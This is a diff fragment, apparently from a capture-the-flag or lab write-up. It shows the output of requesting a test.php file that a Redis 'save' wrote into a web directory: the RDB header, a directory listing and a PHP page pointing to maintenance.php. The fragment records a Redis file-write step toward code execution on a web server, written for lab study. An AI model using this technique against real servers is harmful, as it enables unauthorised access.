@@ -683,6 +683,31 @@ save
 exit
 
 curl -o- http://localhost/test.php
+
+REDIS0009�      redis-ver5.0.3�
+�edis-bits�@�ctime�V>�_used-mem��
+ aof-preamble��� test@Mtotal 24
+drwx------ 1 www-data www-data 4096 Dec 22 00:31 .
+drwxr-xr-x 1 root     root     4096 Nov 24 18:52 ..
+-rwx------ 1 www-data www-data  488 Dec 22 00:30 index.php
+-rwx------ 1 www-data www-data  783 Nov 24 18:50 maintenance.php
+-rw-r--r-- 1 root     root      182 Dec 22 00:31 test.php
+<?php
+# We found the bug!!
+#
+#         \   /
+#         .\-/.
+#     /\ ()   ()
+#       \/~---~\.-~^-.
+# .-~^-./   |   \---.
+#      {    |    }   \
+#    .-~\   |   /~-.
+#   /    \  A  /    \
+#         \/ \/
+# 
+echo "Something is wrong with this page! Please use http://localhost/maintenance.php to se
+e if you can figure out what's going on"
+?>
 ```
 
 
